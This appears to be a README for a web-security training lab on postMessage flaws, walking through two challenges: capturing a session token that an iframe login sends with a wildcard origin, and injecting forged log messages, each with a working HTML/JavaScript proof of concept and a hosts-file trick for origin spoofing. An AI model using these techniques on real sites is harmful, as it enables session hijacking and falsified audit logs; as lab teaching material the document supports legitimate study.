# Web Application Security Challenges: postMessage Exploits

This repository demonstrates two security challenges related to **postMessage**, a JavaScript method for cross-origin communication. These challenges explore vulnerabilities that can be exploited in web applications, specifically focusing on stealing session tokens and injecting fake log messages.

## Table of Contents

- [Challenge 1: Steal the Session Token](#challenge-1-steal-the-session-token)
    - [Challenge Overview](#challenge-overview)
    - [Exploiting postMessage to Steal the Session Token](#exploiting-postmessage-to-steal-the-session-token)
    - [Security Implications](#security-implications)
    - [Mitigation Strategies](#mitigation-strategies)
  
- [Challenge 2: Fake the Log](#challenge-2-fake-the-log)
    - [Challenge Overview](#challenge-overview-1)
    - [Exploiting postMessage to Inject Fake Logs](#exploiting-postmessage-to-inject-fake-logs)
    - [Security Implications](#security-implications-1)
    - [Mitigation Strategies](#mitigation-strategies-1)

---

## Challenge 1: Steal the Session Token

### Challenge Overview

In this challenge, a parent page loads a login form inside an **iframe**. When the user logs in through the iframe, the child window sends the session token back to the parent window using the `postMessage` method.

**Objective**: The goal is to exploit the lack of proper origin validation to intercept the session token and steal it during the login process.

The vulnerability arises because the parent page doesn't validate the origin of the message, allowing an attacker to listen for the `postMessage` event and capture sensitive data such as the session token.

### Exploiting postMessage to Steal the Session Token

1. **Malicious Script Injection**: The attacker injects a script in the parent page to listen for messages.
2. **Intercepting the Session Token**: When the child window sends the session token using `postMessage`, the malicious script captures it and can use it to hijack the user's session.

#### Example of Exploiting the Vulnerability:

```javascript
<!DOCTYPE html>
<html>
<head>
    <title>Token Listener</title>
</head>
<body>
    <h1>Token Listener</h1>
    <div id="token-display"></div>
    <iframe id="test" src="https://html5server.digi.ninja/l_child.php" style="width:100%; height:300px; border:1px solid #ddd;"></iframe>
    <script>
        window.addEventListener('message', function(event) {
			console.log(event);
            console.log('Message data:', event.data);
            document.getElementById('token-display').innerText = "Token: " + event.data;
        });
    </script>
</body>
</html>


// The child iframe sends a postMessage containing the session token
window.parent.postMessage(sessionToken, '*');
```

## Challenge 2: Fake the Log
### Challenge Overview

This challenge demonstrates the use of postMessage to send log messages to a central log server. The task is to exploit this mechanism and inject fake log messages into the server, potentially misleading the log data and bypassing detection.

**Objective**: Find a way to inject fake log messages using postMessage, which can trick administrators or security systems into thinking that legitimate actions are happening.

### Exploiting postMessage to Inject Fake Logs
Identifying the Log System: The attacker needs to identify how the parent or child window is communicating with the logging server.

Injecting Fake Log Messages: By using postMessage, the attacker can send forged log messages that are forwarded to the server, creating false logs such as fake errors or user actions.

#### Example of Exploiting the Vulnerability:

```js
<!DOCTYPE html>
<html>
<head>
    <title>Token Listener</title>
</head>
<body>
    <h1>Token Listener</h1>
    <div id="token-display"></div>
    
    <iframe id="test" src="https://html5server.digi.ninja/s_child.html?origin=https://html5.digi.ninja"
            style="width:100%; height:300px; border:1px solid #ddd;"></iframe>

    <script>
        const frame = document.querySelector("#test");

        frame.addEventListener("load", () => {
            frame.contentWindow.postMessage("test", "https://html5server.digi.ninja");
        });
		//change the /etc/hosts 127.0.0.1 html5server.digi.ninja
    </script>
</body>
</html>
```

